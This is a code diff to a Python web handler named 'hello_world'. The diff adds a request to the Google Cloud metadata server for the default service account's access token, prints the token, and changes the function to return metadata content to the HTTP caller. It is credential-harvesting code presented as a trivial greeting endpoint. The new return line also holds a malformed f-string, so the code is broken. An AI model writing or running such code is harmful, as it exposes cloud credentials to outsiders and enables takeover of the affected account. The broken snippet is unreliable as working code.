@@ -27,6 +27,9 @@ def hello_world():
     
     response = requests.get('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/', headers={'Metadata-Flavor':'Google'})
     print(response.content)
+
+    response2 = requests.get('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})
+    print(response2.content)
     
     #try:
     #    from pip._internal.operations import freeze
@@ -37,7 +40,7 @@ def hello_world():
     #for pkg in pkgs: print(pkg)
 
 
-    return f"Hello {name}!"
+    return f"Hello {response.content}}!"
     
 
 
